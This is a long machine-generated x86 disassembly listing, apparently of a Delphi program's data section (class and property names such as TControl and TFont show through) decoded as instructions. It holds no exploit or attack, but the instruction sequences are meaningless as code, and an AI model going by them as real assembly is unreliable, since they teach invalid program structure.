add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x66
inc ebx
add [ eax ] cl
add [ eax ] al
add [ ebp + 0x43 ] ah
add [ ecx + eax * 2 - 0x6c73ffc0 ] ch
inc ebx
add [ ebx + edx * 4 + 0x43 ] bh
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] dl
xchg esp eax
inc ebx
add [ esp + edx * 4 + 0x43 ] al
add [ esp + edx * 4 + 0x43 ] bl
add ah dl
xchg ecx eax
inc ebx
add al al
xchg ebx eax
inc ebx
add [ eax + 0x68004391 ] bl
xchg esp eax
inc ebx
add [ ebx + edx * 4 ] ah
inc ebx
add [ eax - 0x13ffbc6c ] cl
xchg ebx eax
inc ebx
add [ ebx + edx * 4 + 0x54120043 ] bl
inc esp
jb r-xdata
inc ebx
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax + 0x4004396 ] cl
xchg ebx eax
inc ebx
add ah dl
xchg ecx eax
inc ebx
add [ ebp + edx * 4 + 0x43 ] al
add [ eax + 0x20004391 ] bl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x13ffbc6c ] cl
xchg ebx eax
inc ebx
add [ ebx + edx * 4 + 0x54140043 ] bl
inc esp
jb r-xdata
xchg ebx eax
add [ esp + edx * 4 + 0x43 ] bl
add ah dl
xchg ecx eax
inc ebx
add al al
xchg ebx eax
inc ebx
add [ eax + 0x68004391 ] bl
xchg esp eax
inc ebx
add [ ebx + edx * 4 ] ah
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x64 ] si
inc bx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
inc bx
add [ eax ] cl
add [ eax ] al
les esp [ ebp + 0x43 ]
add [ ecx + eax * 2 - 0x6c73ffc0 ] ch
inc ebx
add [ eax - 0x3fffbc6c ] ch
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] dl
xchg esp eax
inc ebx
add [ esp + edx * 4 + 0x43 ] al
inc ebx
add [ ecx + eax * 2 - 0x6c73ffc0 ] ch
inc ebx
add [ eax - 0x3fffbc6a ] ah
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edx * 4 - 0x6befffbd ] dl
inc ebx
add [ eax + 0x4004396 ] cl
xchg ebx eax
inc ebx
add ah dl
xchg ecx eax
inc ebx
add [ ebp + edx * 4 + 0x43 ] al
add [ eax + 0x20004391 ] bl
xchg ebx eax
inc ebx
add [ ebx + edx * 4 ] ah
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax * 4 + 0x67 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp + 0x67 ] si
inc ebx
add [ eax + 0x4365 ] dl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
xchg ebx eax
inc ebx
add [ ebx + edx * 4 ] ah
inc ebx
add [ ebx + edx * 4 ] ch
inc ebx
add [ ebp + edx * 4 - 0x6b53ffbd ] ah
inc ebx
add ah ah
xchg ebp eax
inc ebx
add [ eax - 0x6a ] ah
inc ebx
add [ esi + edx * 4 + 0x43 ] dh
add [ eax - 0x6bffbc6a ] bl
xchg esi eax
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
sub al 0x67
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] ch
add [ eax ] bh
add [ eax ] al
add [ ebp + 0x43 ] ah
add [ ecx + eax * 2 - 0x6c73ffc0 ] ch
inc ebx
add [ ebx + edx * 4 + 0x43 ] bh
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edx * 4 - 0x6befffbd ] dl
inc ecx
add al cl
insd
inc ecx
add ah al
inc esi
inc edx
add [ eax + 0x8004246 ] dh
test eax 0x540e0043
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
xchg esp eax
push 0x43
add [ ebx + edx * 4 ] ch
inc ebx
add [ ebp + edx * 4 - 0x6b53ffbd ] ah
inc ebx
add ah ah
xchg ebp eax
inc ebx
add [ eax - 0x6a ] ah
inc ebx
add [ esi + edx * 4 + 0x43 ] dh
add [ eax - 0x6bffbc6a ] bl
xchg esi eax
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
inc ecx
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ ebx + 0x4367f4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] dh
inc ebx
add [ eax ] bh
add [ eax ] al
loopne r-xdata
add [ eax ] bl
aas
inc eax
add [ eax ] bl
mov ebx 0xbb680044
add [ ebx + ebx * 8 ] ah
inc ecx
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ eax + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
push 0x640043
add [ eax ] al
shr [ eax + 0x43 ] 0x0
pop es
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
sub al 0xe4
inc ecx
add [ esp + esi * 4 ] bl
inc esp
add [ eax + eax * 8 ] bh
inc esp
add [ eax ] al
loop r-xdata
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
jb r-xdata
add ah ah
fiadd [ ecx ]
inc esp
add ah ch
fld [ ecx ]
enter 0x416d 0x0
sbb [ ebx - 0x4497ffbc ] bh
jae r-xdata
inc ecx
inc eax
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
movsb [ edi ] [ esi ]
imul eax [ ebx ] 0x43541407
jne r-xdata
add ah al
mov edx 0xe4ec0044
inc ecx
add [ eax + 0x240041e4 ] dl
in al 0x41
add [ esp + 0x41 ] dl
add [ eax ] ch
in al 0x41
add [ eax - 0x4b ] dh
inc esp
add [ esi + edi * 4 + 0x44 ] ah
add ah bh
mov ebp 0xc13c0044
inc esp
add [ esp + edx * 2 ] dl
inc ebx
jne r-xdata
add [ eax ] al
and [ eax ] ah
inc edx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah bl
test al 0x43
add [ esi + ebp * 2 + 0x6eb40041 ] ch
add [ eax ] al
add [ eax + ebp * 2 + 0x640043 ] ch
push 0x208c0043
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
insb
mov edx 0xada00044
inc ebx
add [ edx + edi * 4 - 0x5203ffbc ] dl
add [ ebx + ebp * 4 + 0x43 ] cl
add [ eax ] cl
jecxz r-xdata
stosd [ edi ]
inc ebx
je r-xdata
mov eax 0xbc004041
je r-xdata
inc ecx
outsd
insb
jae r-xdata
popa
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x436ac890
add [ ebx ] al
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
add [ edx + edi * 4 - 0x51dfffbc ] bl
inc ebx
add [ edx + edi * 4 - 0x50c3ffbc ] ah
xchg esp eax
add ah dl
lodsd [ esi ]
insd
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ eax - 0x43ffbfbf ] bh
insd
inc ebx
outsd
outsb
je r-xdata
add [ ebp + 0x69340040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x43 ] ch
add [ eax + eax - 0x4e2c0000 ] ch
inc esp
add al ch
loope r-xdata
insd
inc ecx
je r-xdata
popad
je r-xdata
inc edx
jne r-xdata
inc ebx
add [ edi + ebp * 4 ] bl
inc ebx
add [ edi + ebp * 4 + 0x43 ] bl
add [ esi + ebp * 4 + 0x43 ] al
add [ eax - 0x43ffbb46 ] bh
mov edx 0xae680044
inc ebx
add ah cl
lodsb [ esi ]
inc ebx
add [ ebp * 4 - 0x529fffbd ] dl
inc ebx
add [ eax - 0x55 ] ch
inc ebx
add [ esi + ebp * 4 ] bl
inc ebx
add [ eax - 0x52 ] al
inc ebx
add [ edi + ebp * 4 + 0x43 ] bh
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
movsb [ edi ] [ esi ]
mov edx 0xaf3c0044
add [ eax ] ah
jecxz r-xdata
inc ebx
add [ ebx ] bh
inc ecx
add [ eax - 0x73ffbc52 ] cl
loop r-xdata
aam 0xad
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
xor al 0x69
inc ebx
add [ edx + esi * 4 + 0x30044 ] dh
or [ ebx + 0x6f ] al
outsb
je r-xdata
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah dl
loop r-xdata
outsd
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
inc eax
add ah bh
inc eax
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
add ah bh
outsd
insd
popad
je r-xdata
adc [ ebp + 0x61 ] ch
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
insd
popad
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
jb r-xdata
inc ecx
inc ebp
popad
je r-xdata
je r-xdata
cmp al 0xaf
mov edx 0xadfc0044
add [ ebx + 0x41 ] dh
add [ eax - 0x54 ] bl
inc ebx
add al ah
mov ecx 0xace00044
inc ebx
add [ eax ] cl
mov edx 0xba1c0044
inc esp
add [ esi + ebp * 4 - 0x52d7ffbd ] dh
inc ebx
add [ eax - 0x46 ] bl
inc esp
add [ edx + edi * 4 + 0x44 ] ch
add [ eax - 0x6bffbc53 ] ah
pop eax
lodsb [ esi ]
outsd
insb
jae r-xdata
inc eax
add [ esp + ebp * 2 + 0x8060043 ] ah
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
inc esp
jb r-xdata
insb
jae r-xdata
adc ch [ ebp + 0x61 ]
dec esi
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
insd
popad
dec esi
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
outsb
inc ecx
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah al
push 0x43
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x6a
inc ebx
add [ eax + eax ] bl
add [ eax ] al
fdiv [ edx + 0x41ac0044 ]
stosb [ edi ]
add [ eax + 0x6c ] ebx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb00436b ] dh
xor al 0x6c
inc ebx
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
shl [ ebx + ebp * 2 + 0xa030043 ] 0x54
inc esp
jb r-xdata
jae r-xdata
imul eax [ ebx ] 0xb
inc ecx
outsb
inc ebp
popad
je r-xdata
popad
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
imul eax [ ebx ] 0x6
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
inc ebx
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
push ebx
je r-xdata
js r-xdata
inc ebx
outsd
outsb
je r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
jae r-xdata
outsd
insb
jae r-xdata
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
lodsb [ esi ]
stosb [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
lodsb [ esi ]
stosb [ edi ]
inc ebx
inc ebx
outsd
outsb
jae r-xdata
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ eax ] bh
stosd [ edi ]
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 - 0x559bffbf ] bl
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
outsd
insb
push es
je r-xdata
popad
inc ebx
add [ ebx ] al
jbe r-xdata
outsd
insb
outsd
jbe r-xdata
or [ esp + eax * 2 + 0x72 ] edx
imul eax [ ebx ] 0x3
jne r-xdata
imul eax [ ebx ] 0x3
push cs
push esp
dec ebp
outsd
inc ecx
add [ esp + edx * 4 + 0x44 ] dl
add ah cl
xchg ebp eax
inc esp
add [ eax - 0x6c ] ch
inc esp
add al cl
xchg ebx eax
inc esp
add [ eax ] cl
push esp
dec ebp
popad
jb r-xdata
imul ebp [ esi + 0x53 ] 0x5657a69
add [ eax ] al
add [ eax ] al
imul esp [ edi + 0x68 ] 0x436cb474
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x436e ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2000436e ] cl
add [ eax ] al
add [ eax ] al
inc edx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 - 0x6bf3ffbf ] bl
inc esp
add [ esi + ebp * 2 + 0x6dc80041 ] dh
mov ah 0x6c
add [ eax + eax ] dl
add bh bh
lodsb [ esi ]
stosb [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
or [ esi + 0x43 ] ch
add [ ecx ] al
or edx [ ebp + ecx * 2 + 0x61 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x436cb474
jb r-xdata
popad
js r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
lea eax [ eax ]
add [ ebx + eax * 2 ] ch
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
jne r-xdata
insb
or esp [ ebp + ebp * 2 + 0x41 ]
outsb
mov eax eax
pop esp
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] al
add [ gs : eax ] eax
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
outsb
imul ebp [ esi + 0x73 ] 0x9800408d
outsb
inc ebx
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] dl
jb r-xdata
inc ebx
add [ eax ] dl
add [ eax ] al
[ edx + ebp * 4 + 0x10043 ]
insb
imul ebp [ esi + 0x74 ] 0x436d2073
add [ edx + eax * 2 + 0x41 ] dh
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
dec esp
insd
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jae r-xdata
insb
jae r-xdata
jpe r-xdata
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6c5cc08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsb
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax + 0x6c ] bl
inc ebx
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
imul ebp [ esi + 0x64 ] 0x1
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add al 0x6b
inc ebx
add [ ecx ] cl
insd
popad
inc esp
add [ eax ] al
dec [ eax + 0x1004494 ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
outsb
inc ebx
add [ eax + eax ] dl
add bh bh
mov [ esp + eax * 2 + 0x100 ] dl
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al [ eax ]
add eax 0x68676952
imul ebp [ esi + 0x73 ] r-xdata
je r-xdata
inc ebx
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
inc ebx
add [ eax ] ch
stosb [ edi ]
inc ebx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
add eax 0x0
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp * 2 + 0x43 ] dh
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add [ eax ] al
insb
inc ebx
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
outsb
lea eax [ bx + si ]
mov al 0x6f
inc ebx
add [ edi ] al
or [ eax + edx * 2 + 0x61 ] dl
imul ebp [ fs : esi + 0x67 ] r-xdata
xchg esp eax
outsb
inc ebx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
outsd
insd
lea eax [ eax ]
test [ edi + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x436f ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2000436f ] ah
add [ eax ] al
add [ eax ] ah
outsb
inc ebx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 - 0x6bf3ffbf ] bl
inc esp
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ esp + edx * 4 + 0x44 ] dl
add ah cl
xchg ebp eax
inc esp
add [ eax - 0x37ffbb69 ] dl
xchg ebx eax
inc esp
add [ eax ] cl
push esp
push eax
popad
imul ebp [ fs : esi + 0x67 ] 0xb000408d
outsd
inc ebx
add [ eax ] dl
add eax [ eax ]
add [ eax ] al
add [ eax ] eax
add edx [ edi + ebp * 2 + 0x70 ]
add al 0x6e
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] cl
add [ eax ] al
[ edx + ebp * 4 + 0x10043 ]
add [ esp + ebp * 2 + 0x80043 ] dh
add bh bh
lodsb [ esi ]
stosb [ edi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
dec esp
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
inc edx
outsd
je r-xdata
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
imul esp [ edi + 0x68 ] 0x436cb474
add [ eax + eax ] cl
add bh bh
imul esp [ gs : edi + 0x68 ] 0x436cb474
adc [ eax ] al
cmp al 0x10
outsd
insd
lea eax [ eax ]
push esp
jo r-xdata
add [ eax ] cl
add [ eax ] al
dec [ eax + 0x1004494 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
je r-xdata
add [ esi + ebp * 2 ] al
inc ebx
add [ eax ] cl
add [ eax ] al
dec [ eax + 0x1004494 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
je r-xdata
add [ esi + ebp * 2 ] al
inc ebx
pop es
or [ esi ] al
push ebx
outsb
jb r-xdata
dec ebp
outsd
jbe r-xdata
push ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
jne r-xdata
add [ eax ] al
dec [ eax + 0x1004494 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
outsb
inc ebx
add [ eax + eax ] cl
add bh bh
mov [ esp + eax * 2 + 0x100 ] dl
add [ eax ] al
dec [ eax + 0x1004494 ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
outsb
inc ebx
add [ eax + eax ] cl
add bh bh
mov [ esp + eax * 2 + 0x100 ] dl
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
popad
je r-xdata
inc ebp
jbe r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jne r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
add [ eax ] al
dec [ eax + 0x1004494 ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
je r-xdata
outsb
inc ebx
add [ eax ] dl
add [ eax ] al
dec [ eax + 0x1004494 ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
add [ eax + edx ] bh
je r-xdata
jb r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
push 0xb746669
jb r-xdata
je r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
inc eax
add [ ebx + 0x4370ccc0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
inc edx
outsd
je r-xdata
add [ eax ] al
dec [ eax + 0x1004494 ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
outsb
inc ebx
add [ eax + eax ] dl
add bh bh
mov [ esp + eax * 2 + 0x100 ] dl
or [ esi ] cl
jbe r-xdata
inc eax
call 0x3c43b30c
adc [ eax ] al
cmp al 0x10
outsb
or al 0x54
dec ebp
outsd
or eax 0x73756f4d
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
imul eax [ ebx ] 0xffffff8d
inc eax
add al ch
jno r-xdata
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
jne r-xdata
pop eax
pop es
dec ecx
outsb
add [ ecx ] al
je r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
add [ ebx ] eax
outsb
je r-xdata
add [ eax + edx ] bh
inc eax
add [ ebx + ebp * 2 ] al
inc edx
popad
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
push esp
dec ebx
jns r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : eax ] dl
push cs
push esp
dec ebp
outsd
jne r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
cmp al [ ecx ]
nop
xor al 0x72
inc ebx
add [ eax ] cl
push cs
add al ch
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
call 0x843b55a
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
push ebx
jb r-xdata
inc ebx
add [ ebp + 0x71e80040 ] cl
inc ebx
add al 0x6b
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
add [ eax ] dl
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x72700040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0x10007261
add ecx [ eax ]
push es
jb r-xdata
adc [ eax ] eax
push 0xe8004010
add [ eax ] dl
add [ eax + r-xdata ] dl
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
push esp
push ebx
dec ebp
outsd
jne r-xdata
jns r-xdata
jb r-xdata
adc [ ecx ] dl
inc eax
add al ch
cmp al [ ecx ]
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0x71300040 ] cl
inc ebx
add [ eax ] cl
adc edx [ ebp + ecx * 2 + 0x6f ]
jne r-xdata
adc [ eax ] al
outsb
add [ 0x66696853 ] al
je r-xdata
je r-xdata
jb r-xdata
push ebx
push 0xb746669
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
outsb
add [ eax ] dl
adc [ eax ] eax
dec edi
jbe r-xdata
add [ ebx ] eax
dec ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
push ebx
outsd
jne r-xdata
or [ esi ] al
inc eax
inc eax
add [ eax + edx ] bh
add [ eax ] dl
adc [ eax ] eax
les ebp [ edx + 0x43 ]
add al ch
cmp al [ ecx ]
cmp al 0x10
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
jne r-xdata
